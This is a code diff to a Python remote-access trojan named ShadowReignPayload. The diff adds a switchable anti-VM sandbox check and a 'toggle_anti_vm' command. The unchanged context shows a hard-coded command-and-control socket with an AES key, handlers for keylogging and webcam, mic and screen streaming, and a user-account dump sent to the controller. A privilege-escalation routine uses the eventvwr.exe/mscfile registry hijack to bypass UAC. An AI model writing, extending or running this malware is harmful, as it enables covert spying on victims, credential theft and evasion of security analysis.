@@ -27,8 +27,9 @@ def rand_name(length=10):
 class ShadowReignPayload:
     def __init__(self):
         self.c2 = ("192.168.1.133", 5251)
-        self.KEY = b"ShadowReignBoss!"  # Matches GUI key
+        self.KEY = b"ShadowReignBoss!"  # 16-byte AES key
         self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        self.anti_vm_enabled = False  # Anti-VM off by default
         self.connect()
         self.keylogger = None
         self.running = True
@@ -67,7 +68,8 @@ class ShadowReignPayload:
                 "hostname": socket.gethostname(),
                 "ip": socket.gethostbyname(socket.gethostname()),
                 "cpu": psutil.cpu_percent(),
-                "ram": psutil.virtual_memory().percent
+                "ram": psutil.virtual_memory().percent,
+                "anti_vm": self.anti_vm_enabled  # Report anti-VM state
             }
             self.sock.send(self.encrypt(json.dumps(info)).encode())
         except Exception as e:
@@ -113,6 +115,7 @@ class ShadowReignPayload:
             "stream_screen": self.stream_screen,
             "stream_webcam": self.stream_webcam,
             "stream_mic": self.stream_mic,
+            "toggle_anti_vm": self.toggle_anti_vm  # New command
         }
         if command in handlers:
             try:
@@ -137,8 +140,10 @@ class ShadowReignPayload:
             except:
                 pass
 
-    # Anti-Analysis
+    # Anti-Analysis (Toggleable)
     def anti_analysis(self):
+        if not self.anti_vm_enabled:
+            return  # Skip if disabled
         try:
             if platform.system() == "Windows":
                 if "VMware" in subprocess.check_output("wmic bios get serialnumber", shell=True, stderr=subprocess.DEVNULL).decode():
@@ -150,6 +155,12 @@ class ShadowReignPayload:
                     exit(0)
         except:
             pass
+
+    def toggle_anti_vm(self, enable):
+        self.anti_vm_enabled = bool(enable)
+        self.sock.send(self.encrypt(json.dumps({"status": f"Anti-VM {'enabled' if self.anti_vm_enabled else 'disabled'}"})))
+        if self.anti_vm_enabled:
+            self.anti_analysis()  # Check immediately if enabled
 
     # Feature Implementations
     def keylogger_start(self, _):
@@ -229,7 +240,6 @@ class ShadowReignPayload:
     def dump_hashes(self, _):
         if platform.system() == "Windows":
             try:
-                # Using wmic as a basic hash-like dump (not true hashes, but system creds)
                 output = subprocess.check_output("wmic useraccount get name,sid", shell=True).decode()
                 self.sock.send(self.encrypt(json.dumps({"hashes": base64.b64encode(output.encode()).decode()})))
             except Exception as e:
@@ -259,7 +269,7 @@ class ShadowReignPayload:
     def elevate_privileges(self, _):
         if platform.system() == "Windows":
             try:
-                subprocess.Popen('reg add HKCU\\Software\\Classes\\mscfile\\shell\\open\\command /ve /d "pythonw {__file__}" /f', shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+                subprocess.Popen(f'reg add HKCU\\Software\\Classes\\mscfile\\shell\\open\\command /ve /d "pythonw {__file__}" /f', shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                 subprocess.Popen('eventvwr.exe', shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                 self.sock.send(self.encrypt(json.dumps({"status": "Attempted privilege elevation"})))
             except Exception as e:
@@ -372,7 +382,6 @@ class Keylogger:
         self.logs = ""
 
 if __name__ == "__main__":
-    # Anti-Analysis
     payload = ShadowReignPayload()
-    payload.anti_analysis()
+    payload.anti_analysis()  # Run once at start, but only acts if enabled
     payload.listen()
